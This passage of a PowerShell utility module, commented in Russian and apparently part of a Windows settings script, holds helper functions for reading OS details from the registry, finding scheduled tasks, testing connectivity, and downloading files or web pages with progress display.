﻿
# Для указания не скролить консоль в строке меню, для открытия отдельных окон или приложений, чтобы команды не передавались открываемым окнам.
# Сбрасывается сама после первого использования.
Function Set-NoConsole-Scroll {
    [bool] $Global:NoConsoleScroll = $true
}

Function Get-ArchOS {
    if ( [System.Environment]::Is64BitOperatingSystem ) { 'x64' } else { 'x86' }
}

Function Get-VersOS {
    [System.Environment]::OSVersion.Version.ToString(3)
}

Function Get-RevisionOS {
    [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion','UBR',$null)
}

Function Get-LangOS {
    # Показывает Изначальный язык Windows (GetSystemDefaultUILanguage)
    #[System.Globalization.CultureInfo]::InstalledUICulture.Name
    # Показывает Установленный языковой пакет (MUI) и правильно настроенный у текущего пользователя.
    [System.Globalization.CultureInfo]::CurrentUICulture.Name
}

Function Get-NameOS
{
    [string] $NameOS      = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName',$null)
    [string] $ReleaseId   = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion','ReleaseId',$null)
    [string] $DisplayVers = [Microsoft.Win32.Registry]::GetValue('HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion','DisplayVersion',$null)

    if ( [System.Environment]::OSVersion.Version.Build -ge 22000 ) { $NameOS = $NameOS -replace ('Windows 10','Windows 11') }

    if     ( $ReleaseId -and $DisplayVers ) { "$NameOS #DarkGray#($ReleaseId, $DisplayVers)#" }
    elseif ( $ReleaseId                   ) { "$NameOS #DarkGray#($ReleaseId)#" }
    else                                    { "$NameOS" }
}

Function Get-Delay ( [Uint16] $ms = 1000 ) {
    Start-Sleep -Milliseconds $ms
}

# Функция для проверки длины строки и подсветки любых нежелательных или проблемных символов в строке
# Для вывода через функцию Write-HostColor. Нужна для проверки пути к скрипту
Function Highlight-Problem-Symbols ( [string] $StringLine = '', [string] $MainColor = 'Cyan', [string] $HighlightColor = 'White:DarkRed' ) {

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    [string] $NotProblemColor = 'DarkGray'

    if ( $StringLine )
    {
        if ( $StringLine -match '[^a-z0-9 ():\\._\-]+' )
        {
            $StringLine = ($StringLine.ToCharArray() | ForEach-Object {

                if ( $_ -match '[^a-z0-9 ():\\._\-]+' ) { "#$HighlightColor#$_#$NotProblemColor#" }
                else                                    { $_ }

            }) -join ''

            $StringLine = "#Red#{0} #DarkGray#| #$NotProblemColor#$StringLine#" -f $(if ( $L.s1 ) { $L.s1 } else { 'Проблемные символы в пути!' })
        }
        elseif ( $StringLine.Length -gt 70 )
        {
            $StringLine = "#Red#{0} #DarkGray#| #$MainColor#$StringLine#" -f $(if ( $L.s2 ) { $L.s2 } else { 'Путь слишком длинный!' })
        }

        "#$MainColor#$StringLine#"
    }
}

# Получение полных путей ко всем задачам по совпадениям с поисковым отрезком в имени, или полным путём
Function Get-Task-FullPaths {

    [CmdletBinding( SupportsShouldProcess = $false )]
    [OutputType( [string[]] )]
    Param(
        [Parameter( Mandatory = $false, ValueFromPipeline = $true, Position = 0 )]
        [string[]] $LikeNames
       ,
        [Parameter( Mandatory = $false, ValueFromPipeline = $false )]
        [switch] $CompareFullPath  # Сравнение шаблона -LikeNames с полным путём, а не только с именем задачи
    )

    Process
    {
        if ( -not $LikeNames ) { Return }

        [string[]] $TaskPaths = $null
        [psobject] $OpenRegKey = $null
        [psobject] $OpenSubKey = $null
          [string] $RegKeyTasks = 'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks'
          [string] $Path = ''
          [string] $Name = ''

        try
        {
            $OpenRegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($RegKeyTasks,'ReadSubTree','QueryValues,EnumerateSubKeys')
        }
        catch { $OpenRegKey = $null }

        if ( $OpenRegKey )
        {
            foreach ( $LikeName in $LikeNames )
            {
                try
                {
                    # Поиск полного пути в разделах задач в реестре по значениям параметра Path
                    foreach ( $SubKey in $OpenRegKey.GetSubKeyNames() )
                    {
                        try { $OpenSubKey = $OpenRegKey.OpenSubKey($SubKey,'ReadSubTree','QueryValues') }
                        catch { $OpenSubKey = $null }

                        if ( $OpenSubKey )
                        {
                            $Path = $OpenSubKey.GetValue('Path',$null)

                            if ( $Path -like '\*' )
                            {
                                if ( -not $CompareFullPath )
                                {
                                    $Name = $Path -Replace ('.*\\([^\\]+$)','$1')
                                    if ( $Name -like $LikeName ) { $TaskPaths += $Path }
                                }
                                else
                                {
                                    if ( $Path -like $LikeName ) { $TaskPaths += $Path }
                                }
                            }

                            $OpenSubKey.Close()
                        }
                    }
                }
                catch {}
            }

            $OpenRegKey.Close()
        }

        $TaskPaths.Where({$_})
    }
}

# Функция для получения пути к файлу для сохранения информации + Создание глобальной переменной,
# с нужным названием и полученным путём внутри этой переменной
Function Get-SaveListPath ( [string] $FileName = 'FileName', [string] $isVarNameGlobal = 'GlobalVarName' ) {

    if ( $CurrentRoot ) { $FileRoot = $CurrentRoot } else { $FileRoot = $env:SystemDrive }
    $VarValue = "$FileRoot\$FileName`_$((Get-Date).ToString('yyyyMMdd-HHmmss')).txt"

    # переменная с полученным путём
    Set-Variable -Name $isVarNameGlobal -Value $VarValue -Scope Global -Force

    # вывод полученного пути из созданной переменной
    Return (& $([scriptblock]::Create("`$$isVarNameGlobal")))
}

Function Test-Internet ( [switch] $Bool, [switch] $Access, [string] $CheckDomain, [switch] $Menu, [uint32] $WaitMS = 6000 )
{
    # Test-NetConnection: Проверка через .NET от PowerShell.exe | Доступ к сети: udp53 Out + TCP Out нужен для PowerShell.exe + файлу скрипта (AutoSettingsPS.ps1)
    # Test-Connection:    Проверка через: C:\Windows\System32\wbem\WmiPrvSE.exe | Доступ: udp53 Out + TCP Out + ICMP Echo Out (доступ для PowerShell.exe и скрипту не нужен)
    # Проверка должна быть по имени домена, чтобы был задйествован и порт udp53, как полный доступ к сети.

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    if ( -not $CheckDomain )
    {
        # Взять адрес из Системных настроек для проверки сети
        $KeyInternet = 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NlaSvc\Parameters\Internet'
        $CheckDomain = [Microsoft.Win32.Registry]::GetValue($KeyInternet,'ActiveWebProbeHost',$null)
    }

    if ( -not $CheckDomain ) { $CheckDomain = 'google.com' }

    Function iNet-Check-Async ( [switch] $Access, [string] $CheckDomain, [uint32] $WaitMS = 6000 ) {

        # Отключение вывода прогресс бара
        $Global:ProgressPreference = 'SilentlyContinue'
        $Local:AsyncResult = $false

        if ( $Access )
        {
            $ScriptBlock = {
                Param($Domain)
                Test-NetConnection -ComputerName $Domain -InformationLevel Quiet -ErrorAction 0 -WarningAction 0 -CommonTCPPort HTTP
            }
        }
        else
        {
            $ScriptBlock = {
                Param($Domain)
                Test-Connection -ComputerName $Domain -Count 1 -BufferSize 512 -Delay 1 -Quiet -ErrorAction 0
            }
        }

        if ( $Access ) { $text = 'Test-Internet + Access' }
        else           { $text = 'Test-Internet' }

        try
        {
            $Local:Runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
            $Local:Runspace.ThreadOptions = [System.Management.Automation.Runspaces.PSThreadOptions]::ReuseThread
            $Local:Runspace.ApartmentState = 'STA'
            $Local:Runspace.Open()

            $Local:AsyncAction = [System.Management.Automation.PowerShell]::Create()
            $Local:AsyncAction.Runspace = $Local:Runspace
            $Local:AsyncAction.AddScript($ScriptBlock).AddArgument($CheckDomain) > $null  # .AddScript для функций/скриптблоков

            $Local:AsyncBeginInvoke = $Local:AsyncAction.BeginInvoke()
            $Local:AsyncAction | Add-Member -MemberType NoteProperty -Name 'AsyncResult' -Value $Local:AsyncBeginInvoke

            # делать пока не будет MS -ge $WaitMS или IsCompleted -eq $true (ожидание асинхронного выполнения)
            if ( $host.Name -eq 'ConsoleHost' )
            {
                [char] $Escape = 27

                # Сдвигание консоли ниже на 1 строку и возврат перед дальнейшим выводом (чтобы вывод не был в упор у нижнего края окна консоли)
                [System.Console]::WriteLine("$Escape[?25l")
                [System.Console]::Write("$Escape[1F$Escape[0J") # 1F - строк для затирания >= 1

                Write-Host "      $text [wait: $WaitMS`ms] " -ForegroundColor Blue -NoNewline

                $Timer = [System.Diagnostics.Stopwatch]::StartNew()
                #do { foreach ( $G in '|','/','—','\','|','/','—','\' ) { [System.Console]::Write("$G`b") ; Start-Sleep -Milliseconds 20 }}
                #until (( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) -or ( $Local:AsyncAction.AsyncResult.IsCompleted ))
                [bool] $Out = $false ; do { foreach ( $G in ' ','·','•','●','○' ) { [System.Console]::Write("$G`b") ; Start-Sleep -Milliseconds 90 
                if (( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) -or ( $Local:AsyncAction.AsyncResult.IsCompleted )) { $Out = $true ; break }}} until ($Out)
                $Timer.Stop()

                [System.Console]::Write("`n$Escape[1F$Escape[0J$Escape[?25h") # 1F - строк для затирания >= 1
            }
            else
            {
                Write-Host "      $text [wait: $WaitMS`ms] ..." -ForegroundColor DarkCyan

                $Timer = [System.Diagnostics.Stopwatch]::StartNew()
                do { Start-Sleep -Milliseconds 50 }
                until (( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) -or ( $Local:AsyncAction.AsyncResult.IsCompleted ))
                $Timer.Stop()
            }

            if ( $Local:AsyncAction.AsyncResult.IsCompleted )
            {
                $Local:AsyncResult = $Local:AsyncAction.EndInvoke($Local:AsyncAction.AsyncResult)

                $Local:Runspace.Close()
                $Local:Runspace.Dispose()

                #$Local:AsyncAction.EndStop($Local:AsyncAction.BeginStop($null,$Local:AsyncBeginInvoke)) > $null
                $Local:AsyncAction.AsyncResult.AsyncWaitHandle.SafeWaitHandle.Close()
                $Local:AsyncAction.AsyncResult.AsyncWaitHandle.SafeWaitHandle.Dispose()
                $Local:AsyncAction.Dispose()
            }
            else { $Local:Runspace.CloseAsync() }
        }
        catch { Write-Host "   $NameThisFunction`: Error Automation.PowerShell" -ForegroundColor Red }

        # Возврат показа прогресс бара
        $Global:ProgressPreference = 'Continue'

        Return $Local:AsyncResult
    }

    # Исключение проверки и отображения состояния интернета для меню, если так настроено в пресете
    if ( $Menu )
    {
        [string] $FilePresets = $FilePresetsGlobal
          [bool] $NotCheckInternet = $false

        $ShowWait = $true

        # Если будут найдены другие файлы для настроек, состоящих из имени и расширения заданного оригинала,
        # то будет использоваться как пресет для настроек первый из дополнительных найденных.
        try
        {
            [string] $PresetsPath = [System.IO.Path]::GetDirectoryName($FilePresets)
            [string] $PresetsName = [System.IO.Path]::GetFileNameWithoutExtension($FilePresets)
            [string] $PresetsExt  = [System.IO.Path]::GetExtension($FilePresets)

            [string] $FoundPresetsMy = ((Get-ChildItem -File -LiteralPath $PresetsPath -ErrorAction Stop).Where({
                $_.Name -like "$PresetsName`?*$PresetsExt"
            },'First')).FullName
        }
        catch { [string] $FoundPresetsMy = '' }

        if ( $FoundPresetsMy ) { $FilePresets = $FoundPresetsMy }

        # Если файл с пресетами существует.
        if ( [System.IO.File]::Exists($FilePresets) )
        {
            # Получение пресетов в переменную.
            try { $ListPresetsGlobal = Get-Content -LiteralPath \\?\$FilePresets -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
        }

        if ( $ListPresetsGlobal.Where({ $_ -match '^\s*Do-not-check-Internet\s*=\s*1\s*=' },'First') )
        {
            $NotCheckInternet = $true
        }

        if ( $NotCheckInternet )
        {
            '#DarkGray#{0}#' -f $(if ( $L.s4 ) { $L.s4 } else { 'Не проверялся       ' })
        }
        else
        {
            if ( iNet-Check-Async -CheckDomain $CheckDomain -WaitMS $WaitMS -Access:$Access )
            {
                if ( $Access )
                {
                    '#Green#{0} #DarkCyan#{1}#' -f $(if ( $L.s1 ) { $L.s1,$L.s1_1 } else { 'OnLine', '(+ PS Доступ)' })
                }
                else
                {
                    '#Green#{0}#' -f $(if ( $L.s2 ) { $L.s2 } else { 'OnLine              ' })
                }
            }
            else
            {
                '#Red#{0}#' -f $(if ( $L.s3 ) { $L.s3 } else { 'OffLine             ' })
            }
        }
    }
    else
    {
        $ResultCheck = $false
        $ResultCheck = iNet-Check-Async -CheckDomain $CheckDomain -WaitMS $WaitMS -Access:$Access

        if ( $Bool )
        {
            $ResultCheck
        }
        else
        {
            if ( $ResultCheck )
            {
                '#Green#OnLine #'
            }
            else
            {
                  '#Red#OffLine#'
            }
        }
    }
}

# Функция для закачки файлов по прямым линкам через System.Net.Http.HttpClient
# Либо вывод результата как строки в stdout для переменной (загрузка текстового файла: xml, txt и т.д.), параметр: -GetString
# задано по умолчанию ждать ответа до 30 сек (максимальное время ожидания ответа сервера ограничено 200 сек)
Function Download-File {

    [CmdletBinding( SupportsShouldProcess = $false, DefaultParameterSetName = 'All' )]
    [OutputType([bool],[string])]
    param (
        [Parameter(Position = 0)][string] $FileUrl
       ,[Parameter(Position = 1, ParameterSetName = 'File'  )][string] $DestFile
       ,[Parameter(              ParameterSetName = 'String')][switch] $GetString
       ,[Parameter()][string] $UserAgent #= "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" #= [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
       ,[Parameter()][int] $WaitMS = 30000
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    # Получение перевода
    [hashtable] $L = $Lang.$NameThisFunction
    [string] $text = ''

    if ( $GetString )
    {
        if ( -not $FileUrl -or $FileUrl -notmatch '^http[s]?:\/\/.+' )
        {
            $text = if ( $L.s1 ) { $L.s1 } else { 'Не указаны параметры' }
            Write-Host "   $NameThisFunction`: $text`: FileUrl: '$FileUrl'" -ForegroundColor DarkYellow
            Return $false
        }
    }
    else
    {
        if ( -not ( $FileUrl -and $DestFile ) -or $FileUrl -notmatch '^http[s]?:\/\/.+' )
        {
            $text = if ( $L.s1 ) { $L.s1 } else { 'Не указаны параметры' }
            Write-Host "   $NameThisFunction`: $text`: FileUrl: '$FileUrl', DestFile: '$DestFile'" -ForegroundColor DarkYellow
            Return $false
        }
    }

    # Подгрузка класса и создание HttpClient Global (не надо диспозить HttpClient в коде)
    if ( -not ( 'System.Net.Http.HttpClient' -as [type] ))
    {
        Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop
        Set-Variable -Name httpClient -Value ([System.Net.Http.HttpClient]::new()) -Force -Visibility Public -Option AllScope -Scope Global
        $httpClient.Timeout = [timespan]::FromSeconds(200)
    }

    if ( $UserAgent )
    {
        # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
        $httpClient.DefaultRequestHeaders.UserAgent.Clear()
        [bool] $resultUA = $httpClient.DefaultRequestHeaders.UserAgent.TryParseAdd($UserAgent)
        if ( -not $resultUA ) { Write-Host "$NameThisFunction`: Error adding User-Agent: $UserAgent" -ForegroundColor DarkYellow }
    }

    [int] $try = 0

    # 1 попытка начать загружать файл
    do
    {
        if ( $try -ge 1 )
        {
            Start-Sleep -Milliseconds 300
            #if ( $Global:Response ) { $Global:Response.Dispose() }
        }

        # Начать соединение с сервером и загрузку данных в буфер
        $Global:Response = $httpClient.GetAsync( $FileUrl, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead )
# $Global:Response.ConfigureAwait($false)
# $Awaiter = $Global:Response.GetAwaiter()

        if ( $Global:Response )
        #if ( $Awaiter )
        {
            if ( $host.Name -eq 'ConsoleHost' )
            {
                [char] $Escape = 27

                # Сдвигание консоли ниже на 1 строку и возврат перед дальнейшим выводом (чтобы вывод не был в упор у нижнего края окна консоли)
                [System.Console]::WriteLine("$Escape[?25l")
                [System.Console]::Write("$Escape[1F$Escape[0J") # 1F - строк для затирания >= 1

                Write-Host "      $NameThisFunction [$WaitMS`ms] " -ForegroundColor Blue -NoNewline

                $Timer = [System.Diagnostics.Stopwatch]::StartNew()

                while ( -not $Global:Response.IsCompleted )
                #while ( -not $Awaiter.IsCompleted )
                {
                    #foreach ( $G in '|','/','—','\','|','/','—','\' ) { [System.Console]::Write("$G`b"); Start-Sleep -Milliseconds 20 }
                    #if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() }
                    foreach ( $G in ' ','·','•','●','○' ) { [System.Console]::Write("$G`b") ; Start-Sleep -Milliseconds 90 
                    if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() ; break }}
                }

                [System.Console]::Write("`n$Escape[1F$Escape[0J$Escape[?25h") # 1F - строк для затирания >= 1
            }
            else
            {
                Write-Host "      $NameThisFunction [$WaitMS`ms] ..." -ForegroundColor DarkCyan

                $Timer = [System.Diagnostics.Stopwatch]::StartNew()

                while ( -not $Global:Response.IsCompleted )
                #while ( -not $Awaiter.IsCompleted )
                {
                    Start-Sleep -Milliseconds 50
                    if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() }
                }
            }

            #if ( $Awaiter.IsCompleted )
            if ( $Global:Response.IsCompleted )
            {
                #$Res = $Awaiter.GetResult()   # не помогает дождаться и = Response.Result
            
                # Без задержки результат (Response.Result) не появляется, хотя IsCompleted переводиться в true (особенно часто при загрузке с google)
                Start-Sleep -Milliseconds 300
            }
        }

        $try++
    }
    until ( $try -ge 1 -or $Global:Response.Result.Content.Headers.ContentLength )

    if ( $GetString ) { [string] $DestFileName = 'GetString' }
    else              { [string] $DestFileName = $([System.IO.Path]::GetFileName($DestFile)) }

    # Если ошибка получения ответа от сервера или вышло время, выйти из функции
    if ( $Global:Response.IsFaulted -or ( -not $Global:Response.Result.IsSuccessStatusCode ) )
    {
        #if ( $Global:Response ) { $Global:Response.Dispose() }

        $text = if ( $L.s2 ) { $L.s2 } else { 'Ошибка сервера.' }
        Write-Warning "$NameThisFunction`: $text $DestFileName `n$FileUrl"

        Return $false
    }
    elseif ( -not $Global:Response.Result.Content.Headers.ContentLength )
    {
        #if ( $Global:Response ) { $Global:Response.Dispose() }

        $text = if ( $L.s3 ) { $L.s3 } else { 'Размер файла с сервера не получен.' }
        Write-Warning "$NameThisFunction`: $text $DestFileName `n$FileUrl"

        Return $false
    }

    if ( $GetString )
    {
        $OutputStream = [System.IO.MemoryStream]::new()
    }
    else
    {
        # Создать файловый стрим для записи файла
        try { $OutputStream = [System.IO.FileStream]::new($DestFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write) }
        catch
        {
            $text = if ( $L.s4 ) { $L.s4 } else { 'Ошибка записи файла.' }
            Write-Warning "$NameThisFunction`: $text $DestFileName`n$($_.CategoryInfo.Category): $($_.Exception.Message)"

            Return $false
        }
    }

    # Начать записывать файл на диск из буфера или в MemoryStream
    $WriteFile = $Global:Response.Result.Content.CopyToAsync($OutputStream)

     [int64] $TotalBytes = $Global:Response.Result.Content.Headers.ContentLength
    [string] $FileSize   = ''

    if     ( $TotalBytes -gt 1gb ) { $FileSize = '{0} Gb' -f ( $TotalBytes / 1gb ).ToString('N1') }
    elseif ( $TotalBytes -gt 1mb ) { $FileSize = '{0} Mb' -f ( $TotalBytes / 1mb ).ToString('N1') }
    elseif ( $TotalBytes -gt 0   ) { $FileSize = '{0} Kb' -f ( $TotalBytes / 1kb ).ToString('N1') }

     [bool] $isDownloaded  = $false
     [bool] $isDownloading = $true

    [int64] $PreviousBytes = 0
      [int] $wait = 0
      [int] $Percent = 0

    # Пока не загружен или пока загружается файл
    while ( -Not $isDownloaded -and $isDownloading )
    {
        # для снятия нагрузки от частоты обработки и вывода прогресса.
        Start-Sleep -Milliseconds 100

        # Получить текущие записанные байты
        [int64] $WritedBytes = $OutputStream.Length

        # Если есть записанные байты, получить текущий процент записи, округляя всегда в меньшую сторону,
        # грубо убирая знаки после запятой, чтобы показывало 100% только когда реально 100%
        $Percent = [System.Math]::Truncate(100*($WritedBytes/$TotalBytes))

        Write-Progress -Activity "Downloading: $DestFileName" -Status "$Percent % | bytes: $WritedBytes / $TotalBytes | $FileSize" -Id 1

        # Если все байты записаны, выйти из while
        if ( $WritedBytes -eq $TotalBytes ) { $isDownloaded = $true }

        # Если нет изменений в записанных байтах, увеличить счетчик ожидания, если есть изменение, то обнулить его.
        if ( $PreviousBytes -eq $WritedBytes ) { $wait++ } else { $wait = 0 }
        $PreviousBytes = $WritedBytes

        # Если счетчик ожидания накопился до 60 (примерно 10 сек, с учетом всех задержек), загрузка остановилась, выйти из while
        if ( $wait -eq 60 ) { $isDownloading = $false }
    }

    Write-Progress -Activity "Downloading: $DestFileName" -Status "$Percent % | bytes: $WritedBytes / $TotalBytes | $FileSize" -Id 1
    Start-Sleep -Milliseconds 500
    Write-Progress -Activity "Downloading: $DestFileName" -Status "$Percent % | bytes: $WritedBytes / $TotalBytes | $FileSize" -Completed -Id 1

    # "wait: $wait | PreviousBytes: $PreviousBytes | WritedBytes: $WritedBytes"

    if ( $TotalBytes -gt 0 ) { [int64] $Global:TotalBytesSize = $TotalBytes } else { [int64] $Global:TotalBytesSize = 0 }
    if ( $FileSize ) { [string] $Global:FileSizeNote = $FileSize } else { [string] $Global:FileSizeNote = '' }

    if ( -not $isDownloaded )
    {
        $text = if ( $L.s5 ) { $L.s5 } else { 'Файл не загружен' }
        Write-Warning "$NameThisFunction`: $text`: $DestFileName"
    }

    # Освободить Response
    # if ( $Global:Response ) { $Global:Response.Dispose() }

    if ( $GetString )
    {
        [String] $String = ''

        if ( $isDownloaded )
        {
            $OutputStream.Position = 0
            $StreamReader = [System.IO.StreamReader]::new($OutputStream)
            $String = $StreamReader.ReadToEnd()
        }

        # Закрытие MemoryStream
        if ( $StreamReader ) { $StreamReader.Dispose() }
        if ( $OutputStream ) { $OutputStream.Dispose() }

        $httpClient.CancelPendingRequests()

        Return $String
    }
    else
    {
        # Закрытие файлового стрима, для разблокировки файла.
        if ( $OutputStream ) { $OutputStream.Close() }

        $httpClient.CancelPendingRequests()

        Return $isDownloaded
    }
}

# Функция получения web страницы через System.Net.Http.HttpClient
Function Get-ContentWebPage {

    [OutputType([string])]
    param (
        # Адрес страницы, которую требуется загрузить
        [Parameter(Position = 0)][string] $Url
       ,[Parameter()][hashtable] $PostBody
       ,[Parameter()][int] $WaitMS = 100000
       ,[Parameter()][string] $UserAgent # = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0" # = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
    )

    if ( -not $Url -or $Url -notmatch '^http[s]?:\/\/.+' )
    {
        $text = if ( $L.s1 ) { $L.s1 } else { 'Не указаны параметры' }
        Write-Host "   $NameThisFunction`: $text`: Url: '$Url'" -ForegroundColor DarkYellow

        Return [string]::Empty
    }

    # Подгрузка класса и создание HttpClient Global (не надо диспозить HttpClient в коде)
    if ( -not ( 'System.Net.Http.HttpClient' -as [type] ))
    {
        Add-Type -AssemblyName 'System.Net.Http' -ErrorAction Stop
        Set-Variable -Name httpClient -Value ([System.Net.Http.HttpClient]::new()) -Force -Visibility Public -Option AllScope -Scope Global
        $httpClient.Timeout = [timespan]::FromSeconds(200)
    }

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    if ( $UserAgent )
    {
        # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"
        $httpClient.DefaultRequestHeaders.UserAgent.Clear()
        [bool] $resultUA = $httpClient.DefaultRequestHeaders.UserAgent.TryParseAdd($UserAgent)
        if ( -not $resultUA ) { Write-Host "$NameThisFunction`: Error adding User-Agent: $UserAgent" -ForegroundColor DarkYellow }
    }

    if ( $PostBody.Count )
    {
        $Data = [System.Collections.Generic.Dictionary[string,string]]::new()
        $PostBody.GetEnumerator() | ForEach-Object { $Data.Add($_.Key, $_.Value) }
        $PostData = [System.Net.Http.FormUrlEncodedContent]::new($Data)

        $Global:Response = $httpClient.PostAsync($Url, $PostData)
    }
    else
    {
        $Global:Response = $httpClient.GetStringAsync($Url)
    }


    #$Global:Response.ConfigureAwait($false)  # толку нет
    #$Awaiter = $Global:Response.GetAwaiter()  # тоже изменений нет

    #region Pulsation

    # Пока нет ответа сервера положительного или отрицательного, предел указывается в $httpClient.Timeout
    if ( $Global:Response )
    #if ( $Awaiter )
    {
        if ( $host.Name -eq 'ConsoleHost' )
        {
            [char] $Escape = 27

            # Сдвигание консоли ниже на 1 строку и возврат перед дальнейшим выводом (чтобы вывод не был в упор у нижнего края окна консоли)
            [System.Console]::WriteLine("$Escape[?25l")
            [System.Console]::Write("$Escape[1F$Escape[0J") # 1F - строк для затирания >= 1

            Write-Host "      $NameThisFunction [$WaitMS`ms] " -ForegroundColor Blue -NoNewline

            $Timer = [System.Diagnostics.Stopwatch]::StartNew()

            while ( -not $Global:Response.IsCompleted )
            #while ( -not $Awaiter.IsCompleted )
            {
                #foreach ( $G in '|','/','—','\','|','/','—','\' ) { [System.Console]::Write("$G`b"); Start-Sleep -Milliseconds 20 } # Spinner
                #if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() }
                foreach ( $G in ' ','·','•','●','○' ) { [System.Console]::Write("$G`b") ; Start-Sleep -Milliseconds 90 
                if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() ; break }}
            }

            [System.Console]::Write("`n$Escape[1F$Escape[0J$Escape[?25h") # 1F - строк для затирания >= 1
        }
        else
        {
            Write-Host "      $NameThisFunction [$WaitMS`ms] ..." -ForegroundColor DarkCyan

            $Timer = [System.Diagnostics.Stopwatch]::StartNew()

            while ( -not $Global:Response.IsCompleted )
            #while ( -not $Awaiter.IsCompleted )
            {
                Start-Sleep -Milliseconds 50
                if ( [math]::Truncate($Timer.Elapsed.TotalMilliseconds) -ge $WaitMS ) { $Timer.Stop() ; $httpClient.CancelPendingRequests() }
            }
        }

        if ( $Global:Response.IsCompleted )
        #if ( $Awaiter.IsCompleted )
        {
            #$Res = $Awaiter.GetResult()   # не помогает дождаться и = Response.Result
            
            # Без задержки результат (Response.Result) не появляется, хотя IsCompleted переводиться в true (особенно часто при загрузке с google)
            Start-Sleep -Milliseconds 300
        }
    }

    #endregion

    if ( $PostBody.Count )
    {
        [int64] $TotalBytes = $Global:Response.Result.Content.Headers.ContentLength
        [String] $String = ''

        if ( $Global:Response.Result )
        {
            $OutputStream = [System.IO.MemoryStream]::new()

            # Начать записывать файл в MemoryStream, wait 20 сек макс
            $Global:Response.Result.Content.CopyToAsync($OutputStream).Wait(20000) > $null

            [int64] $WritedBytes = $OutputStream.Length

            if ( $TotalBytes -eq $WritedBytes )
            {
                $OutputStream.Position = 0
                $StreamReader = [System.IO.StreamReader]::new($OutputStream)
                $String = $StreamReader.ReadToEnd()
            }

            # Закрытие MemoryStream
            if ( $StreamReader ) { $StreamReader.Dispose() }
            if ( $OutputStream ) { $OutputStream.Dispose() }
        }

        #if ( $Global:Response ) { $Global:Response.Dispose() }

        Return $String
    }
    else
    {
        #if ( $Global:Response ) { $Global:Response.Dispose() }

        #$Global:Response.Wait() # нет толку

        Return $Global:Response.Result
    }
}

# Функция получения версии из строки (например имени файла)
Function Get-VersionFromName {

    [OutputType([version])]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNullOrEmpty()]
        [string] $Str
    )

    process
    {
        if ( $Str -match '(?<Vers>(?:(\d+)\.)?(?:(\d+)\.)?(?:(\d+)\.\d+))' )
        {
            [version] $Version = $null
            if ([version]::TryParse($Matches.Vers, [ref] $Version)) { Return $Version }
        }
    }
}

# Функция получения списка файлов с прямыми ссылками по публичным ссылкам с облаков Google Drive и Yandex Disk
# используются функции: Get-ContentWebPage, Get-VersionFromName
Function Get-DirectoryItems {

    [OutputType([array])]
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string] $Url
    )

    # Получение имени этой функции.
    [string] $NameThisFunction = $MyInvocation.MyCommand.Name

    [array] $DirectoryItems = @()
    [psobject] $Content = $null

    if ( $Url -like 'http*.Yandex.*' -or $Url -like 'http*yadi.sk*' )
    {
        $Url      = [Uri]::UnescapeDataString($Url)
        $API      = 'https://cloud-api.yandex.net/v1/disk/public/resources/'
        $Key      = $Url -replace '(http(s)*:\/(\/[^\/]+){3}).*','$1'  # захват начальной части URL
        $Path     = [Uri]::EscapeDataString($Url -replace $Key)
        $QueryUri = '{0}?public_key={1}&path={2}&limit=1000' -f $API, $Key, $Path  # &limit=1000  для увеличения ограничения выдачи списка файлов, по умолчанию = 20

        $Content = Get-ContentWebPage -Url $QueryUri

        try { $DirectoryItems = ConvertFrom-Json $Content } catch {}

        if ( $DirectoryItems._embedded.items.count )
        {
            $DirectoryItems = $DirectoryItems._embedded.items
            $DirectoryItems | ForEach-Object {
                $Params = @{
                    InputObject = $_
                    MemberType = 'NoteProperty'
                    Name = 'Version'
                    Value = Get-VersionFromName -Str $_.Name
                }

                Add-Member @Params -Force -ErrorAction SilentlyContinue
            }

